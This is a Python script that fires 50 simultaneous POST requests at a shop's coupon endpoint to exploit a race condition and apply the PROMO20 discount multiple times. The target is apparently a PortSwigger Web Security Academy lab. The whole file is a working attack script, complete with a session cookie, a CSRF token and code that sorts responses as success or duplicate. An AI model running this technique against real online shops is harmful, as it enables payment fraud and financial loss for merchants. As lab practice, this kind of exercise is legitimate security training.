import asyncio
import aiohttp
import time

bpc = 1
nc = 50

async def blast(session, url, headers, data, task_id):
    for i in range(bpc):  # Bursts per connection
        start = time.time()
        try:
            async with session.post(url, headers=headers, data=data) as resp:
                end = time.time()
                body = await resp.text()
                status = resp.status
                # Track different server responses
                if "Invalid coupon" in body:
                    result = "INVALID"
                elif "Coupon already applied" in body:
                    result = "DUPLICATE"
                elif "apply coupon" in body or resp.status == 200:
                    result = "SUCCESS?"
                else:
                    result = f"UNKNOWN: {status}"
                
                print(f"[{task_id:02d}-{i:02d}] {result} | Time: {(end-start):.3f}s | Len: {len(body)}")
        except Exception as e:
            end = time.time()
            print(f"[{task_id:02d}-{i:02d}] ERROR: {str(e)} | Time: {(end-start):.3f}s")

async def main():
    url = "https://0acb004103b9c15780113f4c002700e2.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": "session=uR3lvHWc24dvFo7yEt8sK4yYDn6zQuMu"
    }
    data = "csrf=fRxBIVld9IEdpCmSIwejrlZYQxq6MRlW&coupon=PROMO20"
    
    print(f"[*] Starting race condition attack at {time.ctime()}")
    print(f"[*] Target: {url}")
    print(f"[*] Concurrent bursts: {nc} connections × {bpc} requests each")
    print("-" * 60)
    
    async with aiohttp.ClientSession() as session:
        # Fire all requests as simultaneously as possible
        tasks = [blast(session, url, headers, data, i) for i in range(nc)]
        await asyncio.gather(*tasks)
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print("[*] Check cart total for multiple discounts")

if __name__ == "__main__":
    asyncio.run(main())
